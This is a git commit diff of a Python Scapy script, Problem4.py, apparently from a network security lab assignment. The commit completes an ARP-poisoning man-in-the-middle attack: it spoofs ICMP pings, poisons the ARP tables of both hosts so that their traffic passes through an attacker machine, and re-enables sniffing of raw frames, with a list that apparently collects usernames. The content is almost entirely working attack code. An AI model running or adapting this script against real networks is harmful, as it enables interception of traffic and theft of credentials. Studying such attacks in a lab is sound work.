1fc8be37a9c21dacfb1312c5461df9ffc65ba12e
teaensweet <teaensweet@gmail.com>
2025-09-30 22:02:06 -0400

    Add files via upload

--- Problem4.py
+++ Problem4.py
@@ -1,13 +1,14 @@
 from scapy.all import *
 import socket
+import time
 
 hostA_IP = '10.9.0.5'
 hostB_IP = '10.9.0.6'
 attacker_IP = '10.9.0.7'
 hostA_MAC = '02:42:0a:09:00:05'
 hostB_MAC = '02:42:0a:09:00:06'
-attacker_MAC = '02:42:96:d0:19:a5'
-interface = 'br-3f634426b26d'
+attacker_MAC = '02:42:e9:d4:2c:fa'
+interface = 'br-4886ec97ed5e'
 
 username = []
 return_cnt = 0
@@ -21,22 +22,25 @@ def poison_arp(spoof_ip, spoof_mac, target_ip, target_mac):
     # spoof an ARP reply to poison the ARP table
     arp_reply = Ether()/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
     sendp(arp_reply, iface=interface)
-    print(f'arp reply summar: {arp_reply.summary()}')
+    print(f'arp reply summary: {arp_reply.summary()}')
 
     print('ARP reply sent - poisoning complete')
 
 def mitm():
     # spoof an ICMP ping to Host A with Host B's IP address
     spoof(hostA_IP, hostB_IP)
-    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)
-    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)
-
-
-    #spoof(hostB_IP, hostA_IP)
+    # wait one second
+    time.sleep(1)
     # map Host A's IP Address to the attacker MAC in Host B's ARP table
-    # map Host B's IP Address to the attacker MAC in Host A's ARP table
-    #poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
+    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)
 
+    # spoof an ICMP ping to Host A with Host B's IP address
+    spoof(hostB_IP, hostA_IP)
+    # wait one second
+    time.sleep(1)
+    # map Host B's IP Address to the attacker MAC in Host A's ARP table
+    poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
+    
 
 def is_raw_frame(pckt):
     return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == '10.9.0.6')
@@ -72,5 +76,6 @@ if __name__ == "__main__":
     spoof(attacker_IP, hostA_IP)
     # spoof an ARP reply in Host A's ARP table
     poison_arp(attacker_IP, attacker_MAC, hostA_IP, hostA_MAC)
+    # man in the middle attack
     mitm()
-    #sniff(iface=interface, lfilter=is_raw_frame, prn=print_pckt)
+    sniff(iface=interface, lfilter=is_raw_frame, prn=print_pckt)
